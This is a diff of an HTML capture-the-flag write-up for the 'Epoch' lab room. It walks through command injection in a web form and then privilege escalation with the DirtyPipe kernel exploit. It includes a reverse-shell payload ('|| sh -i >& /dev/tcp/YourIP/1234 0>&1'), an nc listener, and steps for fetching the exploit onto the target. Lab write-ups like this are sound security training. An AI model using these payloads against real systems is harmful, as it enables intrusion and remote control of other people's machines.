@@ -1,122 +1,83 @@
 <h1>writeup-Epoch</h1>
+In this writeup, i will include all the steps i took to solve the room.
 <img src="./img/logo.png" alt="logo" width="700">
 <blockquote><h3>
-    The room description suggests tha there is a vulnerable WebApplication, So let's start the machine and check out the WebApplication.
-    The room also suggests Command Injection so maybe that's the vulnerability in the WebApplication.
+    The room description suggests tha there is a vulnerable WebApplication and also asking us to check out another room related to <code>Command Injection</code>.
 </h3></blockquote>
-<br>
 
 <ol>
     <li>
-        <h2>Reconnaissance</h2>
+        <strong>Step 1 :</strong>
         <ul>
-            <li>
-                <h3>Port Scanning</h3>
-                <ul>
-                    Rustscan result :
-                    <ul>
-                        <code>Open 10.10.215.48:22 - ssh</code><br>
-                        <code>Open 10.10.215.48:80 - http</code>
-                    </ul>
-                </ul>
-            </li>
-            <li>
-                <h3>SSH</h3>
-                <ul><code>
-                    OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
-                </code></ul>
-            </li>
-            <li>
-                <h3>WebPage</h3>
-                <ul>
-                    <img src="./img/webPage.png" alt="webPage" width="500"><br>
-                </ul>
-            </li>
+            Check out the WebApplication.
+            <img src="./img/webPage.png" alt="webPage" width="500"><br>
         </ul>
     </li><br>
     <li>
-        <h2>Foothold</h2>
+        <strong>Step 2 :</strong>
         <ul>
-            <li>
-                <h3>SSH</h3>
-                <ul>Brute forcing ssh with hydra will definitely fail and it's not the main objective 
-                    of this room so let's move on to the WebApplication.</ul>
-            </li>
-            <li>
-                <h3>WebApplication</h3>
-                <ul>
-                    We will start with Command Injection because the room description suggests that.
-                    Let's try some command injection tricks from <a href="https://book.hacktricks.xyz/pentesting-web/command-injection">hacktricks</a>. <br>
-                    <img src="./img/webPage2.png" alt="webPage2" width="500"><br>
-                    Now that we know command injection works, let's get a shell.
-                    <ul>
-                        <li>Step 1:
-                            <ul>
-                                Start a nc listener.<br>
-                                <code>nc -lvnp 1234</code>
-                            </ul>
-                        </li>
-                        <li>Step 2:
-                            <ul>
-                                Enter your reverse shell command in the input field with command injection vulnerability and click on <code>Convert</code>.<br>
-                                <code>|| sh -i >& /dev/tcp/YourIP/1234 0>&1</code><br>
-                                You will get a reverse shell.
-                            </ul>
-                        </li>
-                    </ul>
-                    <h3>
-                        You can find your flag hidden in enviorment variables.
-                    </h3>
-                </ul>
-            </li>
+            Let's try Command Injection in the input field from <a href="https://book.hacktricks.xyz/pentesting-web/command-injection">hacktricks</a>.
+            <img src="./img/webPage2.png" alt="webPage2" width="500"><br>
+            It works.
+        </ul>
+    </li><br>
+    <li>
+        <strong>Step 3 :</strong>
+        <ul>
+            Let's get a reverse shell by using this payload -> <code>|| sh -i >& /dev/tcp/YourIP/1234 0>&1</code>. <br>
+            <img src="./img/shell.png" alt="shell">
+        </ul>
+    </li><br>
+    <li>
+        <strong>Step 4 :</strong>
+        <ul>
+            Try to find user.txt and flag.txt using <code>find</code> command.<br>
+            <Strong>FAILED!</Strong><br>
+            Maybe the only flag we get is the root flag.
+        </ul>
+    </li><br>
+    <h2>Get root</h2>
+    <li>
+        <strong>Step 5 :</strong>
+        <ul>
+            <code>sudo -l</code><br>
+            <code>sh: 1: sudo: not found</code>
+        </ul>
+    </li><br>
+    <li>
+        <strong>Step 6 :</strong>
+        <ul>
+            <code>crontab</code><br>
+            <code>cat: /etc/crontab: No such file or directory</code>
+        </ul>
+    </li><br>
+    <li>
+        <strong>Step 7 :</strong>
+        <ul>
+            <code>env</code><br>
+            Found the flag.......<br>
+            I might have left the room since i already have the flag but i want to see if i can get root.
         </ul>
     </li>
     <li>
-        <h2>Root</h2>
+        <strong>Step 8 :</strong>
         <ul>
-            <li>
-                <h3>Things i tried and didn't work :</h3>
-                <ol>
-                    <li>
-                        <code>sudo -l</code>
-                        <ul>
-                            <code>sh: 2: sudo: not found</code>
-                        </ul>
-                    </li>
-                    <li>
-                        <code>find / -type f -perm -04000 2>/dev/null</code>
-                        <ul>Nothing intresting here</ul>
-                    </li>
-                    <li>
-                        crontab
-                        <ul>
-                            <code>No such file or directory</code>
-                        </ul>
-                    </li>
-                </ol>
-            </li>
-            <li>
-                <h3>Thing that did work :</h3>
-                <ul>
-                    <code>uname -a</code> will show you that this machine is running on <code>linux kernel version 5</code> which might be vulnerable to <code>DirtyPipe</code>.
-                    So heres how we will exploit that.
-                    <li>
-                        Step 1:
-                        <ul>Download <a href="https://www.exploit-db.com/exploits/50808">DirtyPipe</a> exploit code on your local machine.</ul>
-                    </li>
-                    <li>
-                        Step 2:
-                        <ul>Start python server on your machine and download the exploit on target machine in <code>/tmp</code> directory.</ul>
-                    </li>
-                    <li>
-                        step 3:
-                        <ul>
-                            compile and execute the executable using <code>gcc</code>.
-                        </ul>
-                    </li>
-                </ul>
-                <img src="./img/root.png" alt="root" width="500">
-            </li>
+            <code>uname -a</code><br>
+            Linux kernel version 5. <br>
+            This might be vulnerable to <code>DirtyPipe exploit</code>.<br>
+            It's a 3 step process to execute this exploit.
+            <ol>
+                <li>
+                    Download <a href="https://www.exploit-db.com/exploits/50808">DirtyPipe</a> exploit code on your local machine.
+                </li>
+                <li>
+                    Start python server on your machine and download the exploit on target machine in <code>/tmp</code> directory.
+                </li>
+                <li>
+                    Compile and execute the executable using <code>gcc</code>.
+                </li>
+                <img src="./img/root.png" alt="root">
+            </ol>
         </ul>
     </li><br>
-</ol>
+    
